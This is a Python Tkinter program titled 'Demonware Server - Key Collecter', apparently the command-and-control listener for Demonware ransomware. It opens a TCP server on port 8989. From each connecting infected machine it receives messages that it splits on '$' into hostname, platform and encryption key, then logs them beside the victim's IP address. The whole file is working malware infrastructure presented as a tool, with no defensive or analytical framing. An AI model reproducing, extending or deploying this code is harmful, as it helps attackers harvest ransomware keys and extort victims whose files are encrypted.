#!/usr/bin/env python3
import os, sys, subprocess, threading, time, datetime, socket, select
from tkinter import *
from tkinter.ttk import *

class MainWindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Demonware Server - Key Collecter") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.configure(background = 'black')
        self.style = Style()
        self.style.theme_use("clam") # Set widget theme
        icon = PhotoImage(file='icon.png') # Set app icon
        self.tk.call('wm', 'iconphoto', self._w, icon) # Call app icon

        # Input field data is being inserted in this dict
        self.options = {
            'host' : StringVar(),
            'port' : IntVar(),
            'remote' : StringVar(),
            'local' : StringVar(),
            'platform' : StringVar(),
            'key' : StringVar(),
        }

        self.bind("<Escape>", self.exit) # Press ESC to quit app

        self.options['host'].set('0.0.0.0')
        self.options['port'].set(8989)

        # Label Frame
        #logo = LabelFrame(self, text = 'Logo', relief = GROOVE, labelanchor = 'nw', width = 950, height = 200)
        #logo.grid(row = 0, column = 0, columnspan = 4)
        #logo.grid_propagate(0)

        # Canvas for image
        #canvas = Canvas(self, highlightthickness=0, height = 150, width = 500)
        #canvas.grid(row=0, column=0, columnspan = 4)

        photo = PhotoImage(file='logo.png')
        #photo = photo.zoom(2)
        photo = photo.subsample(4)
        label = Label(self, image=photo, background = 'black')
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0)

        label2 = Label(self, image=photo, background = 'black')
        label2.image = photo # keep a reference!
        label2.grid(row = 0, column = 3)

        # Log Frame
        result = LabelFrame(self, text = 'Log', relief = GROOVE)
        result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
        self.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
        self.options['log'].grid(row = 0, column = 1)

        # Tags
        self.options['log'].tag_configure('yellow', foreground='yellow')
        self.options['log'].tag_configure('red', foreground='red')
        self.options['log'].tag_configure('deeppink', foreground='deeppink')
        self.options['log'].tag_configure('orange', foreground='orange')
        self.options['log'].tag_configure('green', foreground='green')
        self.options['log'].tag_configure('bold', font='bold')

        #self.options['log'].insert('1.0', 'Set Hosts, range and script, then click Scan!\n', 'bold')

        # Bottom input fields:
        Label(self, text = 'Host: ', background = 'black', foreground = 'white').grid(row = 5, column = 0)
        Entry(self, textvariable = self.options['host']).grid(row = 5, column = 1)

        Label(self, text = 'Port: ', background = 'black', foreground = 'white').grid(row = 5, column = 2)
        Entry(self, textvariable = self.options['port']).grid(row = 5, column = 3)

        # Bottom buttons
        start_server = Button(self, text = "START SERVER", command = self.start_thread, width = 53).grid(row = 6, column = 0, columnspan = 2)
        #stop_server = Button(self, text = "STOP SERVER", command = self.scan, width = 53).grid(row = 4, column = 1, columnspan = 2)
        exit = Button(self, text = "EXIT", command = self.destroy, width = 53).grid(row = 6, column = 2, columnspan = 2)

        header = 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
        self.options['log'].insert('1.0', '{0[0]} {0[1]} {0[2]} {0[3]}'.format(header), 'green')

    def start_thread(self):
        #self.enter_data.destroy()

        # Start server as thread
        thread = threading.Thread(target=self.start_server)
        thread.daemon = True
        thread.start()

    def start_server(self):
        host = self.options['host'].get()
        port = self.options['port'].get()
        socket_list = []

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(10)

        # add server socket object to the list of readable connections
        socket_list.append(server_socket)

        self.insert_banner()
        self.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')

        try:
            while True:
                ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)

                for sock in ready_to_read:
                    # a new connection request recieved
                    if sock == server_socket:
                        sockfd, addr = server_socket.accept()
                        socket_list.append(sockfd)
                    else:
                        try:
                            data = sock.recv(1024)
                            if data:
                                data = data.decode('UTF-8')
                                ip = addr[0]
                                local = data.split('$')[0]
                                system = data.split('$')[1]
                                key = data.split('$')[2]

                                self.options['log'].insert('1.0', '[%s %s] %s %s %s %s\n' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')

                            else:
                                if sock in socket_list:
                                    socket_list.remove(sock)
                        except:
                            continue
        except KeyboardInterrupt:
            print('Closed...\n')


        server_socket.close()

    def exit(self, event):
        sys.exit(0)

    #def set_options(self):
    #    self.enter_data = Toplevel()
    #    self.enter_data.title(string = 'Enter Host and Port')
    #    self.enter_data.resizable(0,0)

    #    Label(self.enter_data, text = 'Host: ').grid(row = 0, column = 1)
    #    self.options['host'] = Entry(self.enter_data, textvariable = self.options['host'])
    #    self.options['host'].grid(row = 0, column = 2)

    #    Label(self.enter_data, text = 'Port: ').grid(row = 1, column = 1)
    #    self.options['port'] = Entry(self.enter_data, textvariable = self.options['port'])
    #    self.options['port'].grid(row = 1, column = 2)

    #    self.options['port'].bind('<Return>', self.start_thread)
    #    self.options['host'].focus()

    def insert_banner(self):
        banner = '''

                         .:'                                  `:.
                         ::'                                    `::
                        :: :.                                  .: ::
                         `:. `:.             .             .:'  .:'
                          `::. `::           !           ::' .::'
                              `::.`::.    .' ! `.    .::'.::'
                                `:.  `::::'':!:``::::'   ::'
                                :'*:::.  .:' ! `:.  .:::*`:
                               :: HHH::.   ` ! '   .::HHH ::
                              ::: `H TH::.  `!'  .::HT H' :::
                              ::..  `THHH:`:   :':HHHT'  ..::
                              `::      `T: `. .' :T'      ::'
                                `:. .   :         :   . .:'
                                  `::'               `::'
                                    :'  .`.  .  .'.  `:
                                    :' ::.       .:: `:
                                    :' `:::     :::' `:
                                     `.  ``     ''  .'
                                      :`...........':
                                      ` :`.     .': '
                                       `:  `"""'  :'
         ______   _______  _______  _______  _                 _______  _______  _______
        (  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
        | (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
        | |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
        | |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
        | |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
        | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
        (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/

        '''

        self.options['log'].insert('1.0', banner + '\n', 'red')

main = MainWindow()
main.mainloop()
